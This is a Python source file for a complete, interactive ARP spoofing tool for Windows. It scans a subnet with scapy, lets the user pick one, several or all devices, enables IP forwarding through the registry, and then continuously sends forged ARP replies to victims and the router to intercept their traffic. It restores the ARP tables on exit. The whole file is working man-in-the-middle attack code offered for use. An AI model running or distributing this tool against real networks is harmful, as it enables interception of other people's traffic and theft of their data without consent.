from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import scapy.all
import time
import winreg
import subprocess

SPOOF_DELAY = 1


def is_ipv4(ip):
    try:
        ip_parts = ip.split('/')
        if len(ip_parts) == 2:
            if 0 <= int(ip_parts[1]) <= 32:
                return "Scan"
        elif len(ip_parts) == 1:
            parts = ip.split('.')
            if len(parts) == 4:
                if all(0 <= int(part) < 256 for part in parts):
                    return "Port"
    except ValueError:
        pass
    return False


# Function to enable IP forwarding on Windows
def enable_ip_forwarding_windows():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print(f"{Fore.GREEN}[*] IP forwarding enabled successfully on Windows!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] An error occurred while enabling IP forwarding on Windows: {e}{Style.RESET_ALL}")


# Function to disable IP forwarding on Windows
def disable_ip_forwarding_windows():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        print(f"{Fore.GREEN}[*] IP forwarding disabled successfully on Windows!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] An error occurred while disabling IP forwarding on Windows: {e}{Style.RESET_ALL}")


def host_up(ipaddress):
    # Method 1: Ping with 3 attempts
    try:
        output = subprocess.check_output(["ping", "-n", "3", ipaddress], universal_newlines=True)
        if "Reply from" in output:
            return True
    except subprocess.CalledProcessError:
        pass

    # Method 2: ARP with longer timeout
    try:
        arp_request = scapy.all.ARP(pdst=ipaddress)
        broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered = scapy.all.srp(arp_request_broadcast, timeout=2, verbose=0)[0]
        if answered:
            return True
    except Exception:
        pass

    return False


def scan_and_get_devices(cidr):
    """Scan the network and return list of (ip, mac) tuples"""
    print(f"{Fore.BLUE}[*] Scanning network {cidr}...{Style.RESET_ALL}")
    arp_request = scapy.all.ARP(pdst=cidr)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.all.srp(arp_request_broadcast, timeout=2, verbose=0)[0]
    devices = []
    for response in answered:
        devices.append((response[1].psrc, response[1].hwsrc))
    return devices


def select_target_from_list(devices, router_ip, my_ip):
    """Display discovered devices and let user pick one or all"""
    print(f"\n{Fore.GREEN}[*] Discovered devices on the network:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'No.':<5} {'IP Address':<18} {'MAC Address'}{Style.RESET_ALL}")
    print("-" * 45)

    # Filter out router and own IP
    valid_devices = []
    for ip, mac in devices:
        if ip != router_ip and ip != my_ip:
            valid_devices.append((ip, mac))

    if not valid_devices:
        print(f"{Fore.YELLOW}[!] No valid target devices found (excluding router and your machine){Style.RESET_ALL}")
        return []

    for idx, (ip, mac) in enumerate(valid_devices, 1):
        print(f"{idx:<5} {ip:<18} {mac}")

    print(f"\n{Fore.YELLOW}[*] Enter device number to target a single device")
    print(f"[*] Enter 'all' to target ALL devices simultaneously")
    print(f"[*] Enter 'multi' to select multiple specific devices{Style.RESET_ALL}")

    choice = input("\n[+] Your choice: ").strip().lower()

    if choice == "all":
        print(f"{Fore.RED}[!] Targeting ALL {len(valid_devices)} devices{Style.RESET_ALL}")
        return valid_devices

    elif choice == "multi":
        indices = input("[+] Enter device numbers separated by space (e.g. 1 3 5): ").split()
        selected = []
        for i in indices:
            try:
                idx = int(i) - 1
                if 0 <= idx < len(valid_devices):
                    selected.append(valid_devices[idx])
                else:
                    print(f"{Fore.YELLOW}[!] Invalid number {i}, skipping{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.YELLOW}[!] Invalid input {i}, skipping{Style.RESET_ALL}")
        return selected

    else:
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(valid_devices):
                return [valid_devices[idx]]
            else:
                print(f"{Fore.RED}[!] Invalid number{Style.RESET_ALL}")
                return []
        except ValueError:
            print(f"{Fore.RED}[!] Invalid input{Style.RESET_ALL}")
            return []


def arp_spoofing_main():
    print(f"{Fore.BLUE}Welcome to ARP Spoofer\n{Style.RESET_ALL}")
    try:
        # Always scan network first
        while True:
            cidr = input("[+] Enter network CIDR notation (e.g. 10.0.0.0/24): ")
            if is_ipv4(cidr) == "Scan":
                break
            else:
                print(f"{Fore.RED}[!] Please enter a valid CIDR notation{Style.RESET_ALL}")

        # Get router IP
        while True:
            router_ip = input("[+] Enter router IP address (e.g. 10.0.0.1): ")
            if is_ipv4(router_ip) == "Port":
                break
            else:
                print(f"{Fore.YELLOW}[!] Please enter a valid IP address{Style.RESET_ALL}")

        # Get own IP to exclude from targets
        my_ip = input("[+] Enter YOUR IP address (to exclude from targets, e.g. 10.0.0.221): ")

        # Check router is up
        if not host_up(router_ip):
            print(f"{Fore.YELLOW}[!] Router/Gateway is down. Please check the gateway IP address{Style.RESET_ALL}")
            return

        # Scan and get all devices
        devices = scan_and_get_devices(cidr)
        if not devices:
            print(f"{Fore.YELLOW}[!] No devices found on the network{Style.RESET_ALL}")
            return

        # Let user select targets
        targets = select_target_from_list(devices, router_ip, my_ip)
        if not targets:
            print(f"{Fore.RED}[!] No targets selected. Exiting.{Style.RESET_ALL}")
            return

        print(f"\n{Fore.GREEN}[*] Starting ARP spoofing on {len(targets)} target(s)...{Style.RESET_ALL}")
        for ip, mac in targets:
            print(f"  {Fore.CYAN}-> {ip} ({mac}){Style.RESET_ALL}")

        # Enable IP forwarding
        enable_ip_forwarding_windows()

        counter = 0
        try:
            while True:
                for target_ip, _ in targets:
                    spoof(target_ip, router_ip)
                    spoof(router_ip, target_ip)
                    counter += 2
                print(f"\r{Fore.MAGENTA}[*] Packets Sent: {counter}{Style.RESET_ALL}", end="")
                time.sleep(2)

        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Stopping ARP spoof and restoring ARP tables...{Style.RESET_ALL}")
            for target_ip, _ in targets:
                print(f"{Fore.YELLOW}[*] Restoring {target_ip}...{Style.RESET_ALL}")
                restore(target_ip, router_ip)
                restore(router_ip, target_ip)
            disable_ip_forwarding_windows()
            print(f"{Fore.GREEN}[*] Done! All ARP tables restored.{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Exiting{Style.RESET_ALL}")
        time.sleep(3)


def spoof(target_ip, spoof_ip_address):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.all.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip_address)
        scapy.all.send(packet, verbose=False)


def get_mac(ip):
    try:
        arp_request = scapy.all.ARP(pdst=ip)
        broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered = scapy.all.srp(arp_request_broadcast, timeout=2, verbose=0)[0]
        return answered[0][1].hwsrc
    except Exception:
        return None


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.all.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.all.send(packet, count=5, verbose=False)  # Send 5 times to ensure restoration


arp_spoofing_main()